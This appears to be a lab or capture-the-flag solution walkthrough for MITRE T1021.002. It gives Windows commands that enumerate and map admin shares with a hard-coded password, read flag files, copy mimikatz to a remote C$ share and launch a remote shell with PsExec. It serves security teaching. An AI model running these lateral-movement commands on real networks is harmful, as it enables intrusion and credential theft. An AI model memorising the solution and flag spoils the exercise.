# T1021.002 – SMB / Windows Admin Shares | Solution Walkthrough
**Difficulty:** Easy | **OS:** Windows | **MITRE:** T1021.002

## Step 1 – Enumerate Shares
```cmd
net view \\localhost /all
# Share name  Type  Used as  Comment
# ADMIN$      Disk           Remote Admin
# C$          Disk           Default share
# IPC$        IPC            Remote IPC
# Target$     Disk           (attacker-planted share)
```

## Step 2 – Map Admin Share C$
```cmd
net use Z: \\localhost\C$ /user:admin_target Admin@Target99!
dir Z:\Windows\System32\flag_T1021_002.txt
type Z:\Windows\System32\flag_T1021_002.txt
net use Z: /delete
```

## Step 3 – Map Custom Share
```cmd
net use Y: \\localhost\Target$ /user:admin_target Admin@Target99!
type Y:\flag.txt
# HACKTIFY{SMB_ADMIN_SHARES_<hostname>}
```

## Step 4 – Copy Files via SMB (Tool Transfer)
```cmd
REM Copy tools to remote host (lateral tool transfer):
copy mimikatz.exe \\remotehost\C$\Windows\Temp\
REM Execute remotely via PsExec (uses ADMIN$ share):
PsExec \\remotehost -u admin -p pass cmd.exe
```

## PowerShell Method
```powershell
$cred = Get-Credential admin_target
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\localhost\C$" -Credential $cred
Get-Content "Z:\Windows\System32\flag_T1021_002.txt"
```
